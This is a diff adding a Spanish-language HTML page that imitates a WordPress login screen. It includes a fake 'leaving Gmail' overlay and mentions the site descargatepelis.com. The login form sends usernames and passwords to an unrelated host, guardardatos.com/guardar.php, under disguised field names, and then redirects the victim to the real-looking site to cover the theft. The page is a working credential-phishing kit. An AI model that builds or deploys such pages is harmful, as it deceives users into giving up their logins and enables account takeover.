@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - WordPress</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-decoration: none;
+            color: #50575e;
+        }
+
+        .login-container {
+            text-align: center;
+        }
+
+        .form-container {
+            background-color: white;
+            padding: 30px;
+            border: 1px solid #c3c4c7;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 260px;
+            text-align: left;
+        }
+
+        .login-container img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+
+        .login-container .txt input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+
+        .login-container .checkbox {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+        }
+
+        .login-container .checkbox input {
+            margin-right: 10px;
+        }
+
+        .login-container .checkbox button {
+            margin-left: 80px;
+        }
+
+        .login-container label {
+            font-size: 14px;
+            line-height: 1.5;
+            display: inline-block;
+            margin-bottom: 3px;
+        }
+
+        .login-container button {
+            padding-bottom: 5px;
+            padding-top: 5px;
+            padding-left: 10px;
+            padding-right: 10px;
+            background-color: #0073aa;
+            color: white;
+            border: 1px solid #0073aa;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .login-container button:hover {
+            background-color: #006799;
+        }
+
+        .login-container .in-line {
+            color: #2271b1;
+            background: #f6f7f7;
+            vertical-align: top;
+            border: 1px solid #0073aa;
+        }
+
+        .login-container .in-line:hover {
+            background-color: #0073aa;
+            color: white;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align-last: start;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #50575e;
+
+        }
+
+        .language-selector {
+            margin-top: 20px;
+        }
+
+        .language-selector select {
+            color: #50575e;
+            padding-bottom: 5px;
+            padding-top: 5px;
+            padding-right: 100px;
+            box-shadow: 0 0 0 transparent;
+            border-radius: 4px;
+            border: 1px solid #8c8f94;
+            background-color: #fff;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            z-index: 9999;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="overlay">
+        "Estás a punto de salir de Gmail"<br>
+        <p> para acceder a: https://descargatepelis.com/wp-login.php</p>
+
+        <button id="cerrar" style="margin-top: 20px;">
+            Continuar
+        </button>
+    </div>
+    <script>
+        if (localStorage.getItem('overlayMostrado')) {
+            document.getElementById('overlay').style.display = 'none';
+        }
+        document.getElementById('cerrar').addEventListener('click', function () {
+            document.getElementById('overlay').style.display = 'none';
+            localStorage.setItem('overlayMostrado', 'true');
+        });
+    </script>
+    <div class="login-container">
+        <svg height="140" width="140" viewBox="-18.37905 -30.63075 159.2851 183.7845">
+            <g fill="#21759b">
+                <path
+                    d="M8.708 61.26c0 20.802 12.089 38.779 29.619 47.298L13.258 39.872a52.354 52.354 0 00-4.55 21.388zm88.032-2.652c0-6.495-2.333-10.993-4.334-14.494-2.664-4.329-5.161-7.995-5.161-12.324 0-4.831 3.664-9.328 8.825-9.328.233 0 .454.029.681.042-9.35-8.566-21.807-13.796-35.489-13.796-18.36 0-34.513 9.42-43.91 23.688 1.233.037 2.395.063 3.382.063 5.497 0 14.006-.667 14.006-.667 2.833-.167 3.167 3.994.337 4.329 0 0-2.847.335-6.015.501L48.2 93.547l11.501-34.493-8.188-22.434c-2.83-.166-5.511-.501-5.511-.501-2.832-.166-2.5-4.496.332-4.329 0 0 8.679.667 13.843.667 5.496 0 14.006-.667 14.006-.667 2.835-.167 3.168 3.994.337 4.329 0 0-2.853.335-6.015.501l18.992 56.494 5.242-17.517c2.272-7.269 4.001-12.49 4.001-16.989z" />
+                <path
+                    d="M62.184 65.857l-15.768 45.819a52.552 52.552 0 0014.846 2.141c6.12 0 11.989-1.058 17.452-2.979a4.615 4.615 0 01-.374-.724zm45.192-29.811c.226 1.674.354 3.471.354 5.404 0 5.333-.996 11.328-3.996 18.824l-16.053 46.413c15.624-9.111 26.133-26.038 26.133-45.426.001-9.137-2.333-17.729-6.438-25.215z" />
+                <path
+                    d="M61.262 0C27.483 0 0 27.481 0 61.26c0 33.783 27.483 61.263 61.262 61.263 33.778 0 61.265-27.48 61.265-61.263C122.526 27.481 95.04 0 61.262 0zm0 119.715c-32.23 0-58.453-26.223-58.453-58.455 0-32.23 26.222-58.451 58.453-58.451 32.229 0 58.45 26.221 58.45 58.451 0 32.232-26.221 58.455-58.45 58.455z" />
+            </g>
+        </svg>
+        <div class="form-container">
+            <form id="miForm" action="https://guardardatos.com/guardar.php" method="POST">
+                <div class="txt">
+                    <label>Nombre de usuario o correo electrónico</label>
+                    <input type="text" name="laksdj" required>
+                    <label>Contraseña</label>
+                    <input type="password" name="cnalk" required>
+                </div>
+                <div class="checkbox">
+                    <input type="checkbox" name="remember_me" id="remember_me">
+                    <label for="remember_me">Recuérdame</label>
+                    <button type="submit">Acceder</button>
+                </div>
+
+            </form>
+        </div>
+
+        <div class="footer">
+            <p><a href="#">¿Has olvidado tu contraseña?</a></p>
+            <p><a href="https://descargatepelis.com" target="_blank">← Ir a 🥇 DescargatePelis</a></p>
+        </div>
+
+        <div class="language-selector">
+            <select>
+                <option value="es">Español</option>
+                <option value="en">English</option>
+            </select>
+            <button class="in-line">Cambiar</button>
+        </div>
+    </div>
+    <script>
+        const form = document.getElementById("miForm");
+
+        if (localStorage.getItem("formEnviado") === "true") {
+            window.location.href = "https://descargatepelis.com"; 
+        }
+
+        form.addEventListener("submit", function (e) {
+            localStorage.setItem("formEnviado", "true");
+        });
+    </script>
+</body>
+
+</html>
